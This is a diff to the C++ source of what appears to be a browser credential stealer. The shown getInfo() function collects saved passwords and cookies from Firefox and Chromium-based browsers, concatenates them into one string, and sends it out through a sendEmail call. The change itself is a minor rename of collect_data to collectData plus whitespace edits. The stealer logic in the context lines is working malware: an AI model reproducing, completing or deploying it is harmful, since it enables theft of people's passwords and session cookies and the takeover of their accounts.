@@ -3,6 +3,8 @@
 #include <iostream>
 #include <fstream>
 #include "includes/ChromeParser.h"
+
+
 #include "includes/FireFoxParser.h"
 #include "includes/FactoryCollector.h"
 #include "includes/SendEmail.h"
@@ -40,21 +42,21 @@ void clear(ICollector<T>* collector)
 void getInfo() {
 	std::string account_info("Password information :\n");
 	auto parser = collector::create_password_collector(collector::BrowserType::Mozilla);
-	gather_result(parser->collect_data(), account_info);
+	gather_result(parser->collectData(), account_info);
 	clear(parser);
 
 	
-	parser = collector::create_password_collector(collector::BrowserType::Chromium);
-	gather_result(parser->collect_data(), account_info);
+	 parser = collector::create_password_collector(collector::BrowserType::Chromium);
+	gather_result(parser->collectData(), account_info);
 	clear(parser);
 
 	account_info += "Cookies information :\n";
 	auto parser_cookie = collector::create_cookies_collector(collector::BrowserType::Mozilla);
-	gather_result(parser_cookie->collect_data(), account_info);
+	gather_result(parser_cookie->collectData(), account_info);
 	clear(parser_cookie);
 
 	parser_cookie = collector::create_cookies_collector(collector::BrowserType::Chromium);
-	gather_result(parser_cookie->collect_data(), account_info);
+	gather_result(parser_cookie->collectData(), account_info);
 	clear(parser_cookie);
 	sendEmail("account infromation", account_info);
 
